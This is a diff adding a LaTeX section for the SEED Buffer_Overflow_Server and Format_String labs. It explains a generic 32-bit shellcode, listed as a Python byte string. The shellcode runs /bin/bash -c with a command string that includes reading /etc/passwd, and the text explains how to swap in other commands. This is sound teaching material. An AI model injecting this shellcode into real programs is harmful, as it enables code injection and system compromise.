@@ -1,0 +1,60 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% This file is used by the following labs. Please check 
+% these labs if changes are made here, so they don't cause
+% problems to those labs:
+%     - Buffer_Overflow_Server
+%     - Format_String
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+Shellcode is typically used in code injection attacks.
+It is basically a piece of code that launches a shell, and
+is usually written in assembly languages.
+In this lab, we only provide the binary version of a generic shellcode,
+without explaining how it works, because it is non-trivial.
+If you are interested in how exactly shellcode works, and
+want to write a shellcode from scratch, you
+can learn that from a separate SEED lab called \textit{Shellcode Lab}.
+Our generic shellcode is listed in the following (we only list
+the 32-bit version):
+
+\begin{lstlisting}[language=python]
+shellcode = (
+   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
+   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
+   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
+   "/bin/bash*"                                                     (*@\ding{202}@*)
+   "-c*"                                                            (*@\ding{203}@*)
+   "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd        *"    (*@\ding{204}@*)
+   # The * in this line serves as the position marker         *
+   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCC"   # Placeholder for argv[2] --> the command string
+   "DDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+\end{lstlisting}
+
+The shellcode runs the \texttt{"/bin/bash"} shell program (Line~\ding{202}),
+but it is given two arguments, \texttt{"-c"} (Line~\ding{203}) and
+a command string (Line~\ding{204}). This indicates that the shell program
+will run the commands in the second argument.
+The \texttt{*} at the end of these strings is only a placeholder,
+and it will be replaced by
+one byte of \texttt{0x00} during the execution of the shellcode. 
+Each string needs to have a zero at the end, but we cannot put 
+zeros in the shellcode. Instead, we put a placeholder at the end of each string, 
+and then dynamically put a zero in the placeholder during the 
+execution. 
+
+If we want the shellcode to run some other commands,
+we just need to modify the command string in Line~\ding{204}.
+However, when making changes, we need to
+make sure not to change the length of this string, because the
+starting position of the placeholder for the \texttt{argv[]} array,
+which is right after the command string,
+is hardcoded in the binary portion of the shellcode. If
+we change the length, we need to modify the binary part.
+To keep the star at the end of this string at the same position,
+you can add or delete spaces.
+
+
